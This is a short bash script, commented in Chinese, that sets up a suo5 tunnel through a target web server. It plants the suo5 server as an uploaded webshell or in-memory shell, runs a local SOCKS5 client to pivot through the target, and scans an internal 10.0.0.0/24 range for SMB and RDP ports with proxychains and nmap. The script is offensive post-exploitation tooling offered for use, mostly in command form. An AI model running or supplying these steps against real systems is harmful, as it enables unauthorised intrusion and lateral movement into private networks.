#!/usr/bin/env bash
TARGET="${1:?usage: bash suo5.sh http://TARGET/upload/shell.jsp}"
# 1) 上传 suo5 的服务端（jsp/php/aspx 任一），或用内存马方式注入
#    下载：https://github.com/zema1/suo5/releases
# 2) 本地起客户端（把目标当跳板）
#    ./suo5 -t "$TARGET" --listen 127.0.0.1:1080 --mode auto
# 3) 验证隧道可用（必须实测，不能只看"连上了"）
#    curl -sS --socks5 127.0.0.1:1080 http://10.0.0.5:8080/ -o /dev/null -w '%{http_code}\n'
#    proxychains4 -f runs/pc-suo5.conf nmap -Pn -p 445,3389 10.0.0.0/24 --open
# 4) 生成用户可直接粘贴的客户端配置
cat > runs/suo5-client.txt <<EOF
# Proxifier / 浏览器 / 命令行都用 socks5
socks5 127.0.0.1 1080
# 目标入口: $TARGET
EOF
echo "客户端配置已写 runs/suo5-client.txt；实测不通就是没打通，不算隧道"
